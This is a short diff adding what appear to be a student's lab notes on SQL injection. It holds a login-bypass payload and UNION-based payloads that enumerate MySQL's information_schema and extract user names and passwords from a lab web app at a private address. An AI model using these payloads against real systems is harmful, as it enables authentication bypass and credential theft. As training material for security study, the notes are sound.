@@ -1,0 +1,36 @@
+Default Databases:
+information_schema
+mysql
+performance_schema
+
+SELECT column,column,column FROM Database.Table
+
+Name = input("please enter username: ")
+pass = input("please enter Password: ")
+name = johndoe
+pass = password
+
+http://10.50.35.75
+tom' or 1 ='1
+username=tom%27+or+1+%3D%271&passwd=tom%27+or+1+%3D%271
+
+f12 + click login
+click posts
+click requests
+click raw
+copy to url
+view page source
+
+/Union.html
+Audi' UNION SELECT 1,2,3,4,5 #
+Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #
+table_schema = databases
+table_name = Tables
+column_name = Columns
+Audi' UNION SELECT id,2,name,pass,5 from session.user; #
+http://10.50.35.75/uniondemo.php?Selection=1&Submit=Submit
+http://10.50.35.75/uniondemo.php?Selection=2%20or%201=1;
+http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT 1,3,2 #
+http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT 1,3,@@version #
+http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
+http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT cost,year,color from session.car #
